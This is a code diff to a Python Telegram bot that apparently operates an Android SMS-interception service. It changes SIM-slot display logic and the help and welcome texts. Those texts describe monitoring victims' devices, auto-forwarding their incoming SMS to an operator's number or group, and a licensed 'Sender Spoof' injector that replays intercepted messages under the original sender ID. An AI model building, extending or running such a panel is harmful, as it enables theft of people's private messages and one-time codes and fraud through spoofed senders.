@@ -126,7 +126,7 @@ def get_sim_list(device: Device) -> list[dict]:
     if isinstance(sims, list) and sims:
         cleaned = [sim for sim in sims if isinstance(sim, dict)]
         if cleaned:
-            return _normalize_sim_slots(cleaned)
+            return _ensure_dual_sim_list(_normalize_sim_slots(cleaned))
 
     primary = device.phone_number
     sim2 = meta.get("sim2") or meta.get("phone2")
@@ -143,17 +143,33 @@ def get_sim_list(device: Device) -> list[dict]:
             }
         )
     if built:
-        return built
-    return [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary or "Unknown"}]
+        return _ensure_dual_sim_list(built)
+    return _ensure_dual_sim_list(
+        [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary or "Unknown"}]
+    )
+
+
+def _ensure_dual_sim_list(sims: list[dict]) -> list[dict]:
+    """Always show SIM 1 + SIM 2 in cards and buttons (Astik layout)."""
+    if not sims:
+        return [
+            {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "N/A"},
+            {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
+        ]
+    ordered = sorted(sims, key=lambda sim: sim.get("slot", sim.get("index", 0) + 1))
+    first = {**ordered[0], "slot": 1, "index": 0}
+    if len(ordered) >= 2:
+        second = {**ordered[1], "slot": 2, "index": 1}
+        return [first, second]
+    return [
+        first,
+        {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
+    ]
 
 
 def get_display_sims(device: Device) -> list[dict]:
-    """UI buttons — show both SIM slots when device reports dual SIM."""
-    sims = get_sim_list(device)
-    if len(sims) >= 2:
-        return sims[:2]
-    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
-    return active if active else sims[:1]
+    """UI — always SIM 1 and SIM 2."""
+    return get_sim_list(device)[:2]
 
 
 def get_active_sims(device: Device) -> list[dict]:
@@ -255,13 +271,8 @@ def _format_sim_number(number: str) -> str:
 
 
 def _sim_has_rich_label(sim: dict) -> bool:
-    carrier = (sim.get("carrier") or "").strip()
-    slot = sim.get("slot", 1)
-    if not _is_valid_sim_number(sim.get("number")):
-        return False
-    if not carrier or carrier in {f"SIM {slot}", "Unknown", "SIM 1", "SIM 2"}:
-        return False
-    return True
+    """Show number/carrier on SIM buttons when we know the slot number."""
+    return _is_valid_sim_number(sim.get("number"))
 
 
 def _sim_list_line(sim: dict, *, found_card: bool = False) -> str:
@@ -334,7 +345,7 @@ def format_device_found_card(
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "✅ Device Found &amp; Set! &lt;/&gt;\n"
-        f"📱 {get_model_name(device)}\n"
+        f"📱 {short_device_id(device.name)}\n"
         f"📞 {_device_phone_display(device)}\n"
         f"🔋 {get_battery(device)}\n"
         f"{format_device_connection_status(device)}\n"
@@ -587,13 +598,13 @@ def format_commands_message() -> str:
         "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
         "1. /key KEY-XXXX-XXXX-XXXX — Your license key\n"
-        "2. /a &lt;device_id&gt; — Pick device to monitor\n"
+        "2. /fy &lt;device_id&gt; — Pick device to monitor\n"
         "3. Pick SIM → /addchannel → /startmonitor\n"
         "4. → Incoming SMS replayed with SAME sender ID via inject"
         "</pre>\n\n"
         "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
         "<pre>"
-        "1. /fdy &lt;device_id&gt; — Find device &amp; select SIM\n"
+        "1. /fb &lt;device_id&gt; — Find device &amp; select SIM\n"
         "2. /mynum &lt;number&gt; — Your forwarding number\n"
         "3. /addchannel — Add group for monitoring\n"
         "4. /startmonitor — Start auto-forwarding"
@@ -626,13 +637,13 @@ def format_welcome_message() -> str:
         "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
         "1. /key KEY-XXXX-XXXX-XXXX — Your license key (like /mynum for inject)\n"
-        "2. /a &lt;device_id&gt; — Pick device to monitor\n"
+        "2. /fy &lt;device_id&gt; — Pick device to monitor\n"
         "3. Pick SIM → /addchannel → /startmonitor\n"
         "4. → Incoming SMS replayed with SAME sender ID via inject API"
         "</pre>\n\n"
         "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
         "<pre>"
-        "1. /fdy &lt;device_id&gt; — Find device &amp; select SIM\n"
+        "1. /fb &lt;device_id&gt; — Find device &amp; select SIM\n"
         "2. /mynum &lt;number&gt; — Your forwarding number\n"
         "3. /addchannel — Add group for monitoring\n"
         "4. /startmonitor — Start auto-forwarding"
@@ -647,7 +658,7 @@ def format_welcome_message() -> str:
         "</pre>\n\n"
         "✨ 🎮 <b>Controls</b>\n"
         "<pre>"
-        "/stop /resume /status /send /ping /help /guide /apk"
+        "/stop /resume /status /send /ping"
         "</pre>"
     )
 
